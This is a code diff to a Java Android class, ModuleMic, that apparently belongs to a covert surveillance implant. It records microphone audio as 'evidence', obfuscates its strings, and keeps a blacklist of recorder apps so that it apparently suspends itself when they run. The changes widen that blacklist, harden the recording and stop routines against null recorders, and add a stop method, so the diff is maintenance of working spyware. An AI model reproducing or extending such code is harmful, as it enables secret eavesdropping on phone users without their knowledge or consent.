@@ -92,7 +92,8 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		blacklist.clear();
 		addBlacklist(M.e("shazam"));
 		addBlacklist(M.e("com.vlingo"));
-		addBlacklist(M.e("com.android.soundrecorder"));
+		addBlacklist(M.e("soundrecorder"));
+		addBlacklist(M.e("voicerecorder"));
 	}
 
 	public synchronized void addBlacklist(String black) {
@@ -275,7 +276,6 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 					resume();
 				}
 			}
-
 		}
 	}
 
@@ -285,8 +285,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	private synchronized void saveRecorderEvidence() {
 
-		if (Cfg.DEBUG) {
-			Check.requires(recorder != null, "saveRecorderEvidence recorder==null"); //$NON-NLS-1$
+		if(recorder==null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveRecorderEvidence) Error: recorder is null");
+				
+			}
+			numFailures += 1;
+			return;
 		}
 
 		byte[] chunk = getAvailable();
@@ -316,9 +321,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 					file.write(data);
 				}
 			} else {
-				//if (Cfg.DEBUG) {
-				//	Check.log(TAG + " (saveRecorderEvidence): plain chunk, no bias");
-				//}
+				// if (Cfg.DEBUG) {
+				// Check.log(TAG +
+				// " (saveRecorderEvidence): plain chunk, no bias");
+				// }
 				data = chunk;
 				if (Cfg.MICFILE) {
 					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
@@ -513,32 +519,31 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	 * Stop recorder.
 	 */
 	private synchronized void stopRecorder() {
-		if (Cfg.DEBUG) {
-			Check.requires(recorder != null, "null recorder"); //$NON-NLS-1$
-		}
-
+	
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stopRecorder)");//$NON-NLS-1$
 		}
 
-		recorder.setOnErrorListener(null);
-		recorder.setOnInfoListener(null);
+		if (recorder != null) {
+			recorder.setOnErrorListener(null);
+			recorder.setOnInfoListener(null);
 
-		try {
-			recorder.stop();
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(ex);
+			try {
+				recorder.stop();
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(ex);
+				}
 			}
-		}
-		recorder.reset(); // You can reuse the object by going back to
-							// setAudioSource() step
-		// recorder.release(); // Now the object cannot be reused
-		getAvailable();
-		deleteSockets();
+			recorder.reset(); // You can reuse the object by going back to
+								// setAudioSource() step
+			// recorder.release(); // Now the object cannot be reused
+			getAvailable();
+			deleteSockets();
 
-		recorder.release();
-		recorder = null;
+			recorder.release();
+			recorder = null;
+		}
 
 	}
 
@@ -691,5 +696,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		}
 
 		suspend();
+	}
+
+	public void stop() {
+		final ManagerModule moduleManager = ManagerModule.self();
+		moduleManager.stop(M.e("mic"));
 	}
 }
